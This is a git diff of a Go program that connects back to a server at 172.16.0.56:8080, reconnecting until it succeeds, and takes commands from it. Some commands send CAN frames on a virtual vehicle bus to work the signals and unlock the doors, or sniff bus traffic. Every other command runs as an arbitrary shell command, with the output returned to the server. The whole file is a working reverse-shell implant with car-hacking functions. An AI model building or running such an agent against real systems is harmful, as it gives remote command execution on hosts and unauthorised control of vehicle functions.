@@ -14,18 +14,33 @@ import (
 	"time"
 )
 
+const (
+	serverAddress = "172.16.0.56:8080"
+	retryDelay    = 5 * time.Second // Delay before retrying connection
+)
+
 func main() {
-	conn, err := net.Dial("tcp", "172.16.0.56:8080")
-	if err != nil {
-		log.Fatalf("Failed to connect to server: %v", err)
+	for {
+		conn, err := net.Dial("tcp", serverAddress)
+		if err != nil {
+			log.Printf("Failed to connect to server: %v", err)
+			time.Sleep(retryDelay) // Wait before retrying
+			continue
+		}
+
+		log.Printf("Connected to server at %s", serverAddress)
+		handleConnection(conn)
 	}
+}
+
+func handleConnection(conn net.Conn) {
 	defer conn.Close()
 
 	for {
 		command, err := bufio.NewReader(conn).ReadString('\n')
 		if err != nil {
-			log.Printf("Failed to read command: %v", err)
-			return
+			log.Printf("Connection lost: %v", err)
+			return // Exit to retry connection in main loop
 		}
 		command = strings.TrimSpace(command)
 
@@ -68,7 +83,6 @@ func main() {
 			runDoorOpen(conn)
 		case "doorclose":
 			runDoorClose(conn)
-
 		default:
 			output, err := executeCommand(command)
 			if err != nil {
@@ -106,71 +120,66 @@ func runLeftSignal(conn net.Conn) {
 		}
 		time.Sleep(1 * time.Second) // Adjust the delay as needed
 	}
-
 }
 
 func runRightSignal(conn net.Conn) {
 	sendCompleteOutput(conn, "Finished Indicating Right...")
 
-	// Command to send CAN messages for left signal
+	// Command to send CAN messages for right signal
 	startTime := time.Now()
 	for time.Since(startTime) < 10*time.Second {
 		cmd := exec.Command("cansend", "vcan0", "188#02")
 		if err := cmd.Run(); err != nil {
-			sendCompleteOutput(conn, fmt.Sprintf("Error indicating left: %v", err))
+			sendCompleteOutput(conn, fmt.Sprintf("Error indicating right: %v", err))
 			return
 		}
 		time.Sleep(1 * time.Second) // Adjust the delay as needed
 	}
-
 }
 
 func runHazardSignal(conn net.Conn) {
 	sendCompleteOutput(conn, "Stopping Hazard Lights...")
 
-	// Command to send CAN messages for left signal
+	// Command to send CAN messages for hazard signal
 	startTime := time.Now()
 	for time.Since(startTime) < 10*time.Second {
 		cmd := exec.Command("cansend", "vcan0", "188#03")
 		if err := cmd.Run(); err != nil {
-			sendCompleteOutput(conn, fmt.Sprintf("Error indicating left: %v", err))
+			sendCompleteOutput(conn, fmt.Sprintf("Error indicating hazard: %v", err))
 			return
 		}
 		time.Sleep(1 * time.Second) // Adjust the delay as needed
 	}
-
 }
 
 func runDoorOpen(conn net.Conn) {
 	sendCompleteOutput(conn, "All doors opened...")
 
-	// Command to send CAN messages for left signal
+	// Command to send CAN messages to open doors
 	startTime := time.Now()
 	for time.Since(startTime) < 10*time.Second {
 		cmd := exec.Command("cansend", "vcan0", "19B#000000")
 		if err := cmd.Run(); err != nil {
-			sendCompleteOutput(conn, fmt.Sprintf("Error indicating left: %v", err))
+			sendCompleteOutput(conn, fmt.Sprintf("Error opening doors: %v", err))
 			return
 		}
 		time.Sleep(1 * time.Second) // Adjust the delay as needed
 	}
-
 }
 
 func runDoorClose(conn net.Conn) {
 	sendCompleteOutput(conn, "All doors closed...")
 
-	// Command to send CAN messages for left signal
+	// Command to send CAN messages to close doors
 	startTime := time.Now()
 	for time.Since(startTime) < 10*time.Second {
 		cmd := exec.Command("cansend", "vcan0", "19B#00000F")
 		if err := cmd.Run(); err != nil {
-			sendCompleteOutput(conn, fmt.Sprintf("Error indicating left: %v", err))
+			sendCompleteOutput(conn, fmt.Sprintf("Error closing doors: %v", err))
 			return
 		}
 		time.Sleep(1 * time.Second) // Adjust the delay as needed
 	}
-
 }
 
 func runSniff(conn net.Conn) {
@@ -211,7 +220,6 @@ func runSniff(conn net.Conn) {
 
 	time.Sleep(15 * time.Second)
 
-
 	if err := cmd.Process.Kill(); err != nil {
 		sendCompleteOutput(conn, fmt.Sprintf("Failed to stop candump: %v", err))
 		return
@@ -231,8 +239,6 @@ func runSniff(conn net.Conn) {
 
 	conn.Write([]byte("[+] candump.log file created\nEOF\n"))
 }
-
-
 
 func executeCommand(command string) (string, error) {
 	cmd := exec.Command("sh", "-c", command)
